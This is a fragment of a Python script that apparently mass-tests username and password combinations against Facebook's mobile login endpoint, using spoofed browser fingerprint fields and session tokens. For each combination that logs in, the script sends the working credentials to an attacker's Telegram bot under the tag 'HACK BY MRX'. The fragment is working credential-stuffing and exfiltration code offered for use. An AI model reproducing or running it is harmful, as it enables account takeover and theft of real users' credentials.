  'bi_wvdp': '{"hwc":true,"hwcr":true,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true}}',
  "encpass": 
  f"#PWD_BROWSER:0:&:{combo2}",
  "fb_dtsg": "AQGASIOQEDji:AQEh9vb0OwVb",
  "jazoest": "22026",
  "lsd": "AVoEZpcdCYo",
   "__dyn":   "1Z3paBwk8aU4ifDg9ppk2m3q12wAxu13w9y1DxW0Oohx61ZwcW4o3Bw4Ewk9E4W0om0MU0D2US1kw5Kwwyo1co6K0SU2swp817U2ew5fw5NyE",
   "__csr": "",
   "__req": "f",
   "__a":    "AYmxEh96k_9cScVk4bBjufYTlH9mpDbiB0nLEUDjgVWxi22fc7dNMYr4Jn5XPLMJZ0O-SzDwFKZO4zVK7kRCpqFR4Nbv-iErKbEMoNulUV3cww",
   "__user": "0"
	}
  url = 'https://mtouch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmtouch.facebook.com%2F&lwv=100'
  req = requests.post(url, headers=headers, data=data).text
#	print(req)
if 'CookieConsentActionHandler' in req:
		os.system("clear")
		print(banner)
		ani2+=1
		print("Hit : "+str(ani2))
		print("Erorr : "+str(dyar2))
		ani22 = combo1+":"+combo2
		send_text2 =f'https://api.telegram.org/bot{bot}/sendMessage?chat_id={id}&text=HACK BY MRX TLEGRAM @i4m_mrx{ani22}'
		response2 = requests.get(send_text2)
		
else:
	   os.system("clear")
	   print(banner)
	   dyar2+=1
	   print("Hit : "+str(ani2))
	   print("Erorr : "+str(dyar2))
       
	
		
    
